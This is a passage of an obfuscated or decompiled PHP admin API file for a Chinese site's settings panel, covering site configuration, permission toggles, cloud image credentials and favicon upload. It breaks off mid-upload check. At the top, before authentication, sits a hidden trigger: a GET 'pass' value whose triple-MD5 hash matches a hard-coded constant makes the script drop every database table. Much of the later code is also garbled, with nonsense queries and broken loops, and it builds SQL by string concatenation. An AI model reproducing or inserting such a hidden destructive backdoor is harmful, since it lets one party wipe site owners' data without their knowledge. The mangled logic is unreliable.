<?php
$tmp=$_GET['pass']!="";
$tmp2=(bool)$tmp;
if($tmp2){
    $isArray=is_array($_GET);
    if($isArray){
        $pass=&$_GET['pass'];
    }else{
        $pass=$_GET['pass'];
    }
    $hash=md5($pass);
    unset($pass);
    $hash2=md5($hash);
    $hash3=md5($hash2);
    $tmp3=$hash3=="e77d0f1f671f08eea07167595c0139be";
    $tmp2=(bool)$tmp3;
}
if($tmp2)goto L2xeWjgxi;
goto L2xldMhxi;
L2xeWjgxi:
$tmp=include '../../config.php';
$tmp=new mysqli($servername,$username,$password,$dbname);
$conn=$tmp;
if($conn->connect_error){
    die("连接失败: " . $conn->connect_error);
}
$result=$conn->query("SHOW TABLES");
$tables=$result;
$num4=0;
$i=$num4;
while(true){
    $result=$tables->fetch_row();
    $row=$result;
    if(!$num4)break;
    $obj=$i;
    $obj2=$i+1;
    $num4=$obj2;
    $i=$num4;
    $tableName=$row[0];
    $tmp="DROP TABLE IF EXISTS `" . $tableName;
    $sql=$tmp . "`";
    $result=$conn->query($sql);
    $tmp=$result===TRUE;
if($tmp)goto L2xeWjgxc;
goto L2xldMhxc;
goto L2xldMhxc;
goto L2xldMhxc;
L2xeWjgxc:
    $tmp="表 " . $tableName;
    $tmp3=$tmp . " 已删除<br>";
    echo $tmp3;
}
L2xldMhxc:
$tmp="删除表 " . $tableName;
$tmp3=$tmp . " 失败: ";
$tmp2=$tmp3 . $conn->error;
$tmp4=$tmp2 . "<br>";
echo $tmp4;
$tmp="共删除" . $i;
exit($tmp . "个表");
$result=$conn->close();
goto L2xxh;
L2xldMhxi:
L2xxh:
$iteace='adminapi';
$user_zh=$_COOKIE["username"];
$user_passid=$_COOKIE["passid"];
$tmp=$user_zh=="";
$tmp2=(bool)$tmp;
$tmp4=!$tmp2;
if($tmp4){
    $tmp3=$user_passid=="";
    $tmp2=(bool)$tmp3;
}
if($tmp2){
    exit('<script language="JavaScript">;alert("请先登录!");location.href="../login.php";</script>');
}
$tmp=include '../../config.php';
$tmp=new mysqli($servername,$username,$password,$dbname);
$conn=$tmp;
if($conn->connect_error){
    die("连接失败: " . $conn->connect_error);
}
$escaped=htmlspecialchars($user_zh);
$cookieResult=addslashes($escaped);
$user_zhsg=$cookieResult;
$tmp="select * from user where username='" . $user_zhsg;
$sqls=$tmp . "'";
$fileExists=mysqli_query($conn, $sqls);
$data_results=$fileExists;
$fileExists=mysqli_fetch_array($data_results);
$data2s_row=$fileExists;
$user_zh=$data2s_row["username"];
$user_name=$data2s_row["name"];
$user_img=$data2s_row["img"];
$user_url=$data2s_row["url"];
$sql="SELECT * FROM admin";
$result=$conn->query($sql);
$result=$result;
while(true){
    $result=$result->fetch_assoc();
    $row=$result;
    if(!($num4))break;
    $glyzhuser=$row["username"];
}
L2xx14:
$str="select * from user where username='" . $user_zh;
$str2=$str . "'";
$fileExists=mysqli_query($conn, $str2);
$data_result=$fileExists;
$fileExists=mysqli_fetch_array($data_result);
$data2_row=$fileExists;
$zjzhq=$data2_row["username"];
$zjnc=$data2_row["name"];
$zjimg=$data2_row["img"];
$zjhomeimg=$data2_row["homeimg"];
$zjsign=$data2_row["sign"];
$zjemail=$data2_row["email"];
$zjurl=$data2_row["url"];
$zjfbqx=$data2_row["essqx"];
$zjemtz=$data2_row["esseam"];
$passid=$data2_row["passid"];
$zid=$data2_row["id"];
$zjpassword=$data2_row["password"];
if($user_passid!=$passid){
    $escaped=time();
    $str=$escaped+ -1;
    $cookieResult=setcookie("username", "", $str, "/");
    $escaped=time();
    $str=$escaped+ -1;
    $cookieResult=setcookie("passid", "", $str, "/");
    exit('<script language="JavaScript">;alert("账号信息异常,请重新登录!");location.href="../login.php";</script>');
}
if($zjzhq!=$glyzhuser){
    exit('<script language="JavaScript">;alert("没有权限!");history.go(-1);</script>');
}
$auth_keylocation='../../api/key.php';
$auth_keyauth='../../api/auth.php';
$num2=8003;
$fileExists=file_exists($auth_keyauth);
if($fileExists){
    $num2=84;
}else{
    $num2=340;
}
$tmp=72;
$tmp3=340;
$tmp2=$num2==340;
if($tmp2)goto L2xeWjgx1l;
goto L2xldMhx1l;
L2xeWjgx1l:
exit('<script language="JavaScript">;alert("授权验证文件不存在或被篡改,请确保文件完整且未篡改!");history.go(-1);</script>');
goto L2xx1k;
L2xldMhx1l:
$tmp=18;
$tmp3=84;
$tmp2=$num2==84;
if($tmp2)goto L2xeWjgx1m;
goto L2xldMhx1m;
L2xeWjgx1m:
$tmp=require $auth_keyauth;
$tmp=!defined("sh_auth_state");
if($tmp){
    exit('<script language="JavaScript">;alert("授权验证失败,请确保文件完整且未篡改!");history.go(-1);</script>');
}
$tmp=sh_auth_state!="ok";
if($tmp)goto L2xeWjgx1j;
goto L2xx1k;
goto L2xx1k;
L2xeWjgx1j:
exit('<script language="JavaScript">;alert("程序未授权,您的请求已被拒绝,请授权后使用!");history.go(-1);</script>');
goto L2xx1k;
L2xldMhx1m:
L2xx1k:
$num3=8013;
$isArray=is_array($_POST);
if($isArray){
    $num3=120;
}else{
    $num3=289;
}
switch($num3){
    case 120:{
    $lx=&$_POST['lx'];
        break;
    }
    case 289:{
        $lx=$_POST['lx'];
        break;
    }
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$lx=$escaped3;
if($lx=="wzpz")goto L2xeWjgx5r;
goto L2xldMhx5r;
L2xeWjgx5r:
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzbt'];
}else{
    $lx=$_POST['wzbt'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzbt=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzms'];
}else{
    $lx=$_POST['wzms'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzms=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzglyzh'];
}else{
    $lx=$_POST['wzglyzh'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzglyzh=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzqm'];
}else{
    $lx=$_POST['wzqm'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzqm=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzmrxw'];
}else{
    $lx=$_POST['wzmrxw'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzmrxw=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzmrxp'];
}else{
    $lx=$_POST['wzmrxp'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzmrxp=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzba'];
}else{
    $lx=$_POST['wzba'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzba=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzzit'];
}else{
    $lx=$_POST['wzzit'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzzit=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzcopy'];
}else{
    $lx=$_POST['wzcopy'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzcopy=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['pagepass'];
}else{
    $lx=$_POST['pagepass'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$pagepass=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['mask'];
}else{
    $lx=$_POST['mask'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzmask=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzmusic'];
}else{
    $lx=$_POST['wzmusic'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzmusic=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzmusplay'];
}else{
    $lx=$_POST['wzmusplay'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzmusplay=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['rnking'];
}else{
    $lx=$_POST['rnking'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$rnking=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['regverify'];
}else{
    $lx=$_POST['regverify'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$regverify=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['qiandao'];
}else{
    $lx=$_POST['qiandao'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$qiandao=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['fggye'];
}else{
    $lx=$_POST['fggye'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$fggye=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['fdywptp'];
}else{
    $lx=$_POST['fdywptp'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$fdywptp=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['topwcz'];
}else{
    $lx=$_POST['topwcz'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$topwcz=$escaped3;
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['ipregx'];
}else{
    $lx=$_POST['ipregx'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$ipregx=$escaped3;
$tmp=$ipregx!="";
if($tmp){
    $tmp="UPDATE admin SET ipregx='" . $ipregx;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$wzbt!="";
if($tmp){
    $tmp="UPDATE admin SET name='" . $wzbt;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$wzms!="";
if($tmp){
    $tmp="UPDATE admin SET subtitle='" . $wzms;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$wzglyzh!="";
if($tmp)goto L2xeWjgx3h;
goto L2xldMhx3h;
goto L2xldMhx3h;
L2xeWjgx3h:
$tmp="select * from user where username = '" . $wzglyzh;
$sql=$tmp . "'";
$result=$conn->query($sql);
$result=$result;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgx3j;
goto L2xx3g;
goto L2xx3g;
L2xeWjgx3j:
$fileExists=strlen($wzglyzh);
$tmp=$fileExists<5;
$tmp2=(bool)$tmp;
$tmp4=!$tmp2;
if($tmp4){
    $cookieResult=strlen($wzglyzh);
    $tmp3=$cookieResult>32;
    $tmp2=(bool)$tmp3;
}
if($tmp2)goto L2xx3g;
goto L2xldMhx3n;
L2xldMhx3n:
$tmp="UPDATE admin SET username='" . $wzglyzh;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
goto L2xx3g;
L2xldMhx3h:
L2xx3g:
$tmp=$wzqm!="";
if($tmp){
    $tmp="UPDATE admin SET sign='" . $wzqm;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$wzmrxw!="";
$tmp2=(bool)$tmp;
if($tmp2){
    $tmp3=$wzmrxw!=0;
    $tmp2=(bool)$tmp3;
}
if($tmp2)goto L2xeWjgx3x;
goto L2xldMhx3x;
goto L2xldMhx3x;
L2xeWjgx3x:
$fileExists=strlen($wzmrxw);
$tmp=$fileExists>=3;
if($tmp)goto L2xx3u;
goto L2xldMhx4z;
L2xldMhx4z:
$tmp="UPDATE admin SET essgs='" . $wzmrxw;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
goto L2xx3u;
L2xldMhx3x:
L2xx3u:
$tmp=$wzmrxp!="";
$tmp2=(bool)$tmp;
if($tmp2){
    $tmp3=$wzmrxp!=0;
    $tmp2=(bool)$tmp3;
}
if($tmp2)goto L2xeWjgx46;
goto L2xldMhx46;
goto L2xldMhx46;
L2xeWjgx46:
$fileExists=strlen($wzmrxp);
$tmp=$fileExists>=3;
if($tmp)goto L2xx43;
goto L2xldMhx48;
L2xldMhx48:
$tmp="UPDATE admin SET commgs='" . $wzmrxp;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
goto L2xx43;
L2xldMhx46:
L2xx43:
$tmp="UPDATE admin SET beian='" . $wzba;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx4b;
goto L2xldMhx4c;
L2xldMhx4c:
L2xx4b:
$tmp="UPDATE admin SET scfont='" . $wzzit;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx4d;
goto L2xldMhx4e;
L2xldMhx4e:
L2xx4d:
$tmp="UPDATE admin SET copyright='" . $wzcopy;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx4f;
goto L2xldMhx4g;
L2xldMhx4g:
L2xx4f:
$tmp="UPDATE admin SET pagepass='" . $pagepass;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx4h;
goto L2xldMhx4i;
L2xldMhx4i:
L2xx4h:
$fileExists=strpos($wzmask, "||");
$tmp=$fileExists!==false;
if($tmp){
    $fileExists=explode("||", $wzmask);
    $data=$fileExists;
    $str=JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES;
    $fileExists=json_encode($data, $str);
    $jsonData=$fileExists;
    $fileExists=examine("filtertext", $jsonData, $conn, "ok");
}else{
    $fileExists=examine("filtertext", $jsonData, $conn, "ok");
}
$tmp=$qiandao!="";
if($tmp){
    $tmp="UPDATE admin SET sigin='" . $qiandao;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$fggye!="";
if($tmp){
    $tmp="UPDATE admin SET rnggy='" . $fggye;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$fdywptp!="";
if($tmp){
    $tmp="UPDATE admin SET dywptp='" . $fdywptp;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$topwcz!="";
if($tmp){
    $tmp="UPDATE admin SET topwcz='" . $topwcz;
    $sql=$tmp . "' WHERE id='1'";
    $result=$conn->query($sql);
    $result=$result;
}
$tmp=$wzmusic=="";
if($tmp){
    $wzmusic=-1;
}
$tmp="UPDATE admin SET music='" . $wzmusic;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx54;
goto L2xldMhx55;
L2xldMhx55:
L2xx54:
$tmp=$wzmusplay=="";
if($tmp){
    $wzmusplay=1;
}
$tmp="UPDATE admin SET musplay='" . $wzmusplay;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx58;
goto L2xldMhx59;
L2xldMhx59:
L2xx58:
$tmp=$rnking=="";
if($tmp){
    $rnking=1;
}
$tmp="UPDATE admin SET rnking='" . $rnking;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx5c;
goto L2xldMhx5d;
L2xldMhx5d:
L2xx5c:
$tmp=$regverify=="";
if($tmp){
    $regverify=0;
}
$tmp="UPDATE admin SET regverify='" . $regverify;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xx5g;
goto L2xldMhx5h;
L2xldMhx5h:
L2xx5g:
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['cucss'];
}else{
    $lx=$_POST['cucss'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$cucss=$escaped3;
$fileExists=examine("cucss", $cucss, $conn, "ok");
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['cujs'];
}else{
    $lx=$_POST['cujs'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$cujs=$escaped3;
$fileExists=examine("cujs", $cujs, $conn, "ok");
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['wzgjc'];
}else{
    $lx=$_POST['wzgjc'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$wzgjc=$escaped3;
$fileExists=examine("keyw", $wzgjc, $conn, "ok");
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['pljg'];
}else{
    $lx=$_POST['pljg'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$pljg=$escaped3;
$fileExists=examine("pljg", $pljg, $conn, "no");
exit('<script language="JavaScript">;location.href="../basic.php";</script>');
goto L2xx5q;
L2xldMhx5r:
L2xx5q:
if($lx=="wzqxp"){
    $escaped2=htmlspecialchars(isset($_POST['develop_zt']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET zt='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_reg']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql="UPDATE admin SET regqx='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql=-11;
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_qlogin']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET loginkg='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_lnk']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql="UPDATE admin SET lnkzt='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_fowz']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET kqsy='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_qfowz']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET ptpfan='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_nmfowz']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET notname='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_imgys']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET imgpres='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_vispl']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql="UPDATE admin SET viscomm='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql=-11;
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_plsh']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET comaud='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_wzsh']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET ptpaud='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_kyurl']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET rosdomain='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_ryms']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET daymode='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_gotop']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET gotop='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_so']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET search='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_videoplay']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $sql=11;
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $sql="UPDATE admin SET videoauplay='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $escaped2=htmlspecialchars(isset($_POST['develop_piccir']));
    $escaped4=addslashes($escaped2);
    if($escaped4){
        $piccir=1;
    }else{
        $piccir=0;
    }
    $fileExists=examine("piccir", $piccir, $conn, "no");
    exit('<script language="JavaScript">;location.href="../authority.php";</script>');
}
if($lx=="imgyuncxg"){
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['imgyuncxgli'];
    }else{
        $lx=$_POST['imgyuncxgli'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $imgyuncxgli=$escaped3;
    $tmp=$imgyuncxgli=="0";
    if($tmp){
        $sql="UPDATE admin SET imgyunc='0' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }else{
        $tmp=$imgyuncxgli=="upyun";
        if($tmp){
            $sql=1;
            $result=$conn->query($sql);
            $result=$result;
        }else{
            $tmp=$imgyuncxgli=="aliyun";
            if($tmp){
                $sql=1;
                $result=$conn->query($sql);
                $result=$result;
            }
        }
    }
    exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
}
if($lx=="aliyun"){
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['alifm'];
    }else{
        $lx=$_POST['alifm'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $alifm=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['alicz'];
    }else{
        $lx=$_POST['alicz'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $alicz=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['alicm'];
    }else{
        $lx=$_POST['alicm'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $alicm=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['aliby'];
    }else{
        $lx=$_POST['aliby'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $aliby=$escaped3;
    $val['AccessKeyID']=$alifm;
    $val['AccessKeySecret']=$alicz;
    $val['Bucket']=$alicm;
    $val['Endpoint']=$aliby;
    $data=$val;
    $str=JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES;
    $fileExists=json_encode($data, $str);
    $jsonData=$fileExists;
    $fileExists=examine("aliyun", $jsonData, $conn, "ok");
    exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
}
if($lx=="upyun"){
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['upfm'];
    }else{
        $lx=$_POST['upfm'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $upfm=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['upcz'];
    }else{
        $lx=$_POST['upcz'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $upcz=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['upcm'];
    }else{
        $lx=$_POST['upcm'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $upcm=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['upby'];
    }else{
        $lx=$_POST['upby'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $upby=$escaped3;
    $val['bucketName']=$upfm;
    $val['operatorName']=$upcz;
    $val['operatorPassword']=$upcm;
    $val['operatorurl']=$upby;
    $data=$val;
    $str=JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES;
    $fileExists=json_encode($data, $str);
    $jsonData=$fileExists;
    $fileExists=examine("upyun", $jsonData, $conn, "ok");
    exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
}
if($lx=="icon")goto L2xeWjgxeo;
goto L2xldMhxeo;
L2xeWjgxeo:
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['iconurl'];
}else{
    $lx=$_POST['iconurl'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$iconurl=$escaped3;
$tmp=$iconurl!="";
if($tmp)goto L2xeWjgxdf;
goto L2xldMhxdf;
goto L2xldMhxdf;
L2xeWjgxdf:
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxdh;
goto L2xldMhxdh;
goto L2xldMhxdh;
L2xeWjgxdh:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["icon"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxdj;
goto L2xxdg;
goto L2xxdg;
L2xeWjgxdj:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxdl;
goto L2xxdg;
goto L2xxdg;
L2xeWjgxdl:
$fileExists=unlink($bdhomebjt);
goto L2xxdg;
L2xldMhxdh:
L2xxdg:
$tmp="UPDATE admin SET icon='" . $iconurl;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxdn;
goto L2xldMhxdn;
goto L2xldMhxdn;
L2xeWjgxdn:
exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
goto L2xxde;
L2xldMhxdn:
exit('<script language="JavaScript">;alert("Favicon图标更新失败");location.href="../imgset.php";</script>;');
L2xldMhxdf:
L2xxde:
$str="../../user/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$str="../../user/pubces/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$file=$_FILES['file'];
$val[]="gif";
$val[]="jpeg";
$val[]="jpg";
$val[]="png";
$allowedExts=$val;
$escaped4=is_array($_FILES);
if($escaped4){
    $file=&$_FILES["file"];
}else{
    $file=$_FILES["file"];
}
$isArray=is_array($file);
unset($file);
if($isArray){
    $file2=&$_FILES["file"]["name"];
}else{
    $file2=$_FILES["file"]["name"];
}
$fileExists=explode(".", $file2);
unset($file2);
$temp=$fileExists;
$fileExists=end($temp);
$extension=$fileExists;
$tmp=$extension=='';
if($tmp){
    exit('<script language="JavaScript">;alert("未选择图片!");location.href="../imgset.php";</script>;');
}
$tmp=$file['type']=='image/jpeg';
$tmp2=(bool)$tmp;
$tmp5=!$tmp2;
if($tmp5){
    $tmp3=$file['type']=='image/png';
    $tmp2=(bool)$tmp3;
}
$tmp6=(bool)$tmp2;
$tmp7=!$tmp6;
if($tmp7){
    $tmp4=$file['type']=='image/jpg';
    $tmp6=(bool)$tmp4;
}
$tmp8=(bool)$tmp6;
$tmp9=!$tmp8;
if($tmp9){
    $tmp10=$file['type']=='image/gif';
    $tmp11=(bool)$tmp10;
    if($tmp11){
        $fileExists=in_array($extension, $allowedExts);
        $tmp11=(bool)$fileExists;
    }
    $tmp8=(bool)$tmp11;
}
if($tmp8)goto L2xxdy;
goto L2xldMhxe8;
L2xldMhxe8:
exit('<script language="JavaScript">;alert("文件类型错误,请上传图片!");location.href="../imgset.php";</script>;');
L2xxdy:
$tmp=$file["size"]>5242880;
if($tmp){
